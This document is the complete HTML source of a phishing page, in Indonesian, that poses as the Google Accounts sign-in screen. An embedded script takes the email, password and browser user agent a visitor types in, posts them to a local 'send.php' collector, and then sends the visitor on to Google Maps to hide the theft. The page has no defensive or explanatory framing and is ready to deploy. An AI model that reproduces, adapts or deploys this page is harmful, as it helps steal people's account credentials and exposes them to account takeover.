<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
body { background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
.container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
.logo { font-size: 24px; font-weight: 500; margin-bottom: 20px; }
.logo span:nth-child(1) { color: #4285f4; }
.logo span:nth-child(2) { color: #ea4335; }
.logo span:nth-child(3) { color: #fbbc05; }
.logo span:nth-child(4) { color: #4285f4; }
.logo span:nth-child(5) { color: #34a853; }
.logo span:nth-child(6) { color: #ea4335; }
h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
input:focus { border-color: #1a73e8; }
.btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 10px; }
.btn:hover { background: #1557b0; }
.footer { margin-top: 30px; font-size: 12px; color: #5f6368; }
.footer a { color: #1a73e8; text-decoration: none; }
</style>
</head>
<body>
<div class="container">
  <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
  <h1>Masuk</h1>
  <p>Gunakan Akun Google Anda</p>
  <form action="send.php" method="POST" onsubmit="return sendLogin(event)">
    <input type="email" name="email" placeholder="Email atau telepon" required>
    <input type="password" name="password" placeholder="Masukkan sandi" required>
    <button type="submit" class="btn">Berikutnya</button>
  </form>
  <div class="footer"><a href="#">Lupa email?</a> · <a href="#">Buat akun</a></div>
</div>
<script>
function sendLogin(e) {
  e.preventDefault();
  const email = document.querySelector('input[name=email]').value;
  const password = document.querySelector('input[name=password]').value;
  fetch('send.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({type: 'login', email: email, password: password, ua: navigator.userAgent})
  }).finally(function() {
    window.location.href = 'https://www.google.com/maps';
  });
  return false;
}
</script>
</body>
</html>
